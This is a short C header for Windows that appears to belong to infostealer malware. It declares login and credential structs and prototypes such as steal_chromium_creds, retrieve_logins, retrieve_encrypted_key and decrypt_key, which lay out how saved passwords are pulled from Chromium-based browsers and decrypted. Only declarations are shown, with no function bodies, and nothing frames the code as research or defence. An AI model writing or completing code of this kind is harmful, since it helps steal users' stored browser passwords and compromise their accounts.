#include <windows.h>

typedef struct {
  char *url;
  char *username;
  char *passwordBlock;
  int passwordBlockSize;
} LoginInfo;

typedef struct {
  char *url;
  char *username;
  char *password;
} Credential;

int steal_chromium_creds();
static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                           LoginInfo **loginsOut);
static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
static int decrypt_key(PCSTR encryptedKey, DATA_BLOB *decryptedKeyOut);
